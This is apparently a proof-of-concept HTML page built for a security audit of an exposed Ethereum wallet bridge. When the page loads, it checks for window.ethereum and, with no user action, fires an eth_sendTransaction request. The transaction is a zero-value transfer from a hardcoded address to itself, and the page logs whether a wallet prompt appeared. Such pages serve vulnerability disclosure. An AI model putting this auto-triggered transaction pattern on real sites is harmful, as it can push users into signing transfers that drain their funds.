<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Audit: JS Bridge Exposure</title>
    <style>
        body { font-family: sans-serif; background: #000; color: #0f0; padding: 20px; }
        #log { border: 1px solid #0f0; padding: 15px; height: 300px; overflow-y: scroll; font-family: monospace; }
    </style>
</head>
<body>
    <h2>Security Audit: Unrestricted JS Bridge</h2>
    <div id="log"></div>

    <script>
        const logBox = document.getElementById('log');
        function addLog(msg) { logBox.innerHTML += `<div>> ${msg}</div>`; }

        async function verifyVulnerability() {
            addLog("Checking window.ethereum...");
            if (window.ethereum) {
                addLog("[!] Bridge object found.");
                
                // Bukti akses: Mencoba memanggil method tanpa interaksi
                try {
                    addLog("Attempting silent transaction trigger...");
                    await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
                            to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
                            value: '0x00',
                            data: '0x'
                        }]
                    });
                    addLog("[+] UI Triggered Successfully.");
                } catch (e) {
                    addLog("[!] UI Triggered (Error: " + e.message + ")");
                }
            } else {
                addLog("[-] Bridge object not found.");
            }
        }
        window.onload = verifyVulnerability;
    </script>
</body>
</html>
